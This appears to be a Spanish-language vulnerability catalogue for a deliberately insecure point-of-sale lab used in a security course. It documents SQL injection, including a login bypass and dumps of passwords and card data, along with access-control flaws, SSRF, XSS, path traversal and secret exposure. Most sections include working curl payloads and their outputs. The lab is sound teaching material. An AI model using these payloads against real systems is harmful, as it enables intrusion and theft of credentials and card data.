# Vulnerabilidades del punto de venta

Este documento lista las vulnerabilidades **deliberadas** del proyecto, donde se
produce cada una y un ejemplo de petición que la demuestra. Todo fue verificado
contra el stack levantado con `docker compose up --build`.

> Aviso: es un laboratorio inseguro a propósito. No lo despliegues en un entorno
> real ni con datos reales.

---

## 1. Inyección SQL (SQLi) — crítico

**Dónde:** `backend/src/main/java/com/curso/pv/common/ConsultasInseguras.java` y las
clases `*ConsultasInseguras` de cada módulo.

Todas las búsquedas arman el SQL pegando el texto recibido, sin usar parámetros
vinculados (`PreparedStatement`). La clase `ConsultasInseguras.crudo()` deja pasar
el valor tal cual.

Endpoints afectados:

| Endpoint | Consulta |
|---|---|
| `GET /api/usuarios/buscar?texto=` | usuarios (nombre y usuario) |
| `GET /api/productos/buscar?texto=` | productos |
| `GET /api/productos/rango?minimo=&maximo=` | productos por precio |
| `GET /api/categorias/buscar?texto=` | categorías |
| `GET /api/clientes/buscar?texto=` | clientes |
| `GET /api/ventas/buscar?estado=&desde=` | ventas |
| `GET /api/ventas/inventario/movimientos?tipo=&desde=` | movimientos de inventario |
| `GET /api/pagos/tarjeta?numero=` | pagos |
| `GET /api/configuracion/categoria/{categoria}` | configuración |

### 1.1 `' OR '1'='1` — declarar verdadero

```bash
curl "http://localhost:8080/api/productos/buscar?texto=%27%20OR%20%271%27%3D%271"
```

Devuelve todo el catálogo ignorando el texto buscado.

### 1.2 UNION — robar otra tabla

Desde la pantalla de usuarios se extraen las contraseñas en texto plano:

```bash
curl "http://localhost:8080/api/usuarios/buscar?texto=%25%27%20UNION%20SELECT%20id%2Cusername%2Cpassword%2Cnombre%2Cemail%2Crol%2Cactivo%2CNOW()%2CNOW()%20FROM%20usuarios%20--%20"
```

```
id  username  password  rol
1   admin     admin     ADMIN
2   admin2    123456    ADMIN
3   vendedor  vendedor  VENDEDOR
4   cajero    cajero    VENDEDOR
```

Con el mismo truco desde el buscador de tarjetas se descarga la tabla `pagos`
completa con PAN y CVV en claro:

```bash
curl "http://localhost:8080/api/pagos/tarjeta?numero=%25%27%20UNION%20SELECT%20id%2Cventa_id%2Cmetodo%2Ctitular%2Cnumero_tarjeta%2Ccvv%2Cfecha_vencimiento%2Cmonto%2Cestado%2Creferencia%2CNOW()%20FROM%20pagos%20--%20"
```

```
id  titular          numeroTarjeta     cvv
1   MARIA GOMEZ      4111111111111111  123
3   LUCIA FERNANDEZ  5555555555554444  456
4   JORGE DIAZ       4222222222222     321
```

> El `numero` va entre comillas simples y sin paréntesis alrededor de la condición,
> por eso el `UNION` se inyecta directo. En consultas donde el `OR` sí está entre
> paréntesis hay que cerrarlos primero (`%')`) antes de agregar el `UNION`.

### 1.3 UNION en el login — robo total de sesión

`UsuariosDetailsService` busca el usuario con el mismo helper, así que el atacante
puede elegir **con qué usuario y contraseña** se autentica. En la pantalla de login,
en el campo de usuario, basta con escribir:

```
' UNION SELECT id,'hacker','1234','Hacker Intruso','h@local','ROL_ADMIN',true,NOW(),NOW() FROM usuarios --
```

y en el campo de contraseña `1234`. Equivalente por API:

```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  --data-binary @bypass.json
```

```json
{"password":"1234","username":"' UNION SELECT id,'hacker','1234','Hacker Intruso','h@local','ROL_ADMIN',true,NOW(),NOW() FROM usuarios -- "}
```

Respuesta:

```json
{"mensaje":"Sesion iniciada","username":"hacker",
 "principal":{"username":"hacker","authorities":[{"authority":"ROL_ROL_ADMIN"}]}}
```

Sesión iniciada para el usuario `hacker` con permisos de administrador, y ese
usuario **no existe** en la base de datos: la fila completa la inventó el atacante
dentro del UNION.

---

## 2. Broken Access Control (BAC / IDOR) — crítico

**Dónde:** `SecurityConfig` deja pasar todas las rutas
(`backend/src/main/java/com/curso/pv/security/SecurityConfig.java`) y
ningún servicio valida que el recurso pertenezca al usuario conectado.

Todos los endpoints responden `200` **sin sesión iniciada**:

```bash
# Anular una venta ajena sin autenticarse
curl -X POST "http://localhost:8080/api/ventas/1/anular?motivo=hack"

# Ver facturas, pagos y datos de otros clientes
curl http://localhost:8080/api/ventas
curl http://localhost:8080/api/pagos
curl http://localhost:8080/api/usuarios
curl http://localhost:8080/api/diagnostico
```

La protección de rol es solo de adorno en el frontend: `RutaProtegida` en
`frontend/src/App.jsx` esconde los enlaces, pero la API no exige nada.

---

## 3. Manipulación de precios desde el cliente — alto

**Dónde:** `VentaControlador.agregarAlCarrito` acepta `precio` como parámetro y
`VentaServicio.checkout` usa ese valor en vez del precio del catálogo.

```bash
# El cliente decide el precio: 3 Gaseosas a 0.01
curl -X POST "http://localhost:8080/api/ventas/carrito?productoId=1&cantidad=3&precio=0.01"
curl -X POST http://localhost:8080/api/ventas/checkout -H "Content-Type: application/json" -d '{"clienteId":1,"descuento":0,"metodoPago":"EFECTIVO"}'
```

Resultado: venta `V-2026-9B68C726` con `total=0.04` cuando el producto cuesta
`5.50` (el stock sí se descuenta: 120 → 117).

---

## 4. SSRF — alto

**Dónde:** `IntegracionControlador.consultarUrl` / `enviar`
(`backend/src/main/java/com/curso/pv/integracion/`).

El backend pide la URL que le manden, sin validar esquema ni destino:

```bash
# Reaching the app's own internals
curl -X POST "http://localhost:8080/api/integraciones/consultar-url?url=http://localhost:8080/api/salud"

# Reaching the database port from the server side
curl -X POST "http://localhost:8080/api/integraciones/enviar?url=http://localhost:3307" \
  -H "Content-Type: application/json" -d '{"destinatario":"a@b.com","mensaje":"prueba"}'
```

La segunda devuelve `{"estado":"ERROR","error":"I/O error on POST request for
\"http://localhost:3307\": Connection refused"}`, lo que confirma que el servidor
atropelló el puerto de MySQL.

---

## 5. XSS

### 5.1 Almacenado

**Dónde:** `frontend/src/pages/Productos.jsx`, `Clientes.jsx`, `Categorias.jsx`,
`Facturas.jsx` renderizan con `dangerouslySetInnerHTML`. Un nombre de producto
`<img src=x onerror=alert(document.cookie)>` se ejecuta en el navegador de todos
los que vean el catálogo.

### 5.2 Reflejado en la exportación

**Dónde:** `ReporteServicio.exportarHtml` concatena el filtro sin escapar.

```bash
curl "http://localhost:8080/api/reportes/exportar/html?estado=COMPLETADA%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

```html
<h2>Reporte de ventas</h2><p>Filtro: cliente=null, estado=COMPLETADA<script>alert(1)</script></p>...
```

### 5.3 CSV injection

`ReporteServicio.exportarCsv` no escapa comas, comillas ni prefijos de fórmula:
un valor que empiece con `=`, `+`, `-` o `@` se ejecuta al abrir el archivo en
Excel.

---

## 6. Gestión insegura de sesiones — alto

**Dónde:** `application.yml` (`server.servlet.session.cookie.*`) y
`AuthControlador`.

La cookie `PVSESSION` se emite así:

```
PVSESSION=3B530295037D7D853409305B72C2E36A; HttpOnly=False; Secure=False
```

- `HttpOnly` desactivado → cualquier XSS puede leerla con `document.cookie`.
- `Secure` desactivado → viaja en texto claro por HTTP.
- Sin `SameSite` → el sitio es vulnerable a CSRF.
- El ID de sesión se devuelve en la respuesta del login y en `/api/auth/sesion`.
- No hay rotación de sesión al iniciar sesión ni al cambiar de privilegios.

---

## 7. Exposición de datos sensibles — alto

| Endpoint | Qué entrega |
|---|---|
| `GET /api/diagnostico` | Configuración secreta: `pasarela.api.key = sk_live_9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c`, `pasarela.secret`, credenciales de correo, todo sin autenticación |
| `GET /api/configuracion/variables` | Lo mismo, por categorías |
| `GET /api/reportes/base-datos` | Estructura de las 10 tablas y cantidad de filas vía `information_schema` |
| `GET /api/pagos/tarjeta?numero=` | PAN y CVV en claro |
| `POST /api/auth/login` | Devuelve el objeto `Authentication` completo, con roles y credenciales |

Además:

- Contraseñas de los usuarios guardadas y comparadas **en texto plano**.
- PAN y CVV de las tarjetas de prueba almacenados sin cifrar en reposo.
- `.env.example` y `application.yml` con credenciales de MySQL y secretos de la
  pasarela escritos en el código.

---

## 8. Manejo de errores y stack traces — medio

**Dónde:** `ManejadorGlobalDeErrores` (`backend/src/main/java/com/curso/pv/common/`).

Cualquier excepción devuelve el mensaje, la causa y el stack trace completo, y lo
peor: responde con **HTTP 200**, así que ni siquiera un `401` o un `500` delata el
fallo:

```bash
curl "http://localhost:8080/api/usuarios/buscar?texto=%25%27%20UNION%20SELECT%201%20--%20"
```

```json
{"causa":"org.hibernate.exception.SQLGrammarException: JDBC exception executing SQL [You have an error in your SQL syntax ...]","mensaje":"...","stackTrace":"org.springframework.dao.InvalidDataAccessResourceUsageException ... 148 more","error":"..."}
```

Ese volcado revela el motor de persistencia, las clases internas, la versión del
driver MySQL y las líneas de código.

---

## 9. Path traversal en la carga de archivos — alto

**Dónde:** `ProductoServicio.guardarImagen`.

Se usa el nombre del archivo tal cual viene del cliente:

```bash
curl -X POST http://localhost:8080/api/productos \
  -F "producto=@producto.json;type=application/json" \
  -F "imagen=@imagen.txt;filename=../../../../tmp/pwned.txt;type=text/plain"
```

El archivo se escribe fuera del directorio de subidas:

```
$ docker compose exec backend ls -l /tmp/pwned.txt
-rw-r--r-- 1 root root 20 Oct 02 21:32 /tmp/pwned.txt
```

y en la base queda registrado `"imagenPath":"/app/uploads/../../../../tmp/pwned.txt"`.

---

## 10. Filtrado de credenciales en la URL — medio

**Dónde:** `UsuarioControlador.cambiarPassword`.

```bash
curl -X POST "http://localhost:8080/api/usuarios/1/password?password=admin123" \
  -H "Content-Type: application/json" -d '{"password":"admin123"}'
```

La contraseña viaja en la query string, así que queda en los logs de acceso, en el
historial del navegador y en la cabecera `Referer`.

---

## 11. Logging inseguro — medio

**Dónde:** `backend/src/main/java/com/curso/pv/log/` y
`frontend/src/api/client.js`.

- El backend registra las peticiones con su cuerpo completo (contraseñas,
  números de tarjeta, CVV y payloads de pago).
- El frontend escribe en consola cada petición y respuesta de Axios.

---

## 12. Configuración en código — bajo

- `application.yml` tiene el usuario **root** de MySQL, su contraseña, secretos de
  la pasarela y `show-stacktrace: always`.
- No hay CSP ni cabeceras de seguridad: `SecurityConfig` no define
  `Content-Security-Policy`, `X-Frame-Options` ni `X-Content-Type-Options`.
- El backend corre como root dentro del contenedor.

---

## Resumen

| # | Vulnerabilidad | Severidad | Endpoint de ejemplo |
|---|---|---|---|
| 1 | SQLi — condición booleana | Crítico | `GET /api/productos/buscar?texto=' OR '1'='1` |
| 2 | SQLi — UNION a otras tablas | Crítico | `GET /api/usuarios/buscar?texto=%' UNION SELECT ...` |
| 3 | SQLi — bypass de autenticación | Crítico | `POST /api/auth/login` con UNION en `username` |
| 4 | Broken Access Control / IDOR | Crítico | `POST /api/ventas/1/anular` sin sesión |
| 5 | Manipulación de precios | Alto | `POST /api/ventas/carrito?precio=0.01` |
| 6 | SSRF | Alto | `POST /api/integraciones/consultar-url?url=http://localhost:8080/api/salud` |
| 7 | Path traversal en upload | Alto | `POST /api/productos` con `filename=../../../x` |
| 8 | Sesiones sin HttpOnly/Secure/SameSite | Alto | cookie `PVSESSION` |
| 9 | Exposición de secretos y estructura de BD | Alto | `GET /api/diagnostico` |
| 10 | XSS almacenado / reflejado / CSV | Medio-alto | `dangerouslySetInnerHTML`, `/api/reportes/exportar/html` |
| 11 | Stack traces y errores con HTTP 200 | Medio | cualquier consulta mal formada |
| 12 | Contraseña en la URL | Medio | `POST /api/usuarios/1/password?password=...` |
| 13 | Logging de datos sensibles | Medio | logs del backend y consola del navegador |
| 14 | Secretos y root en el código | Bajo | `backend/src/main/resources/application.yml` |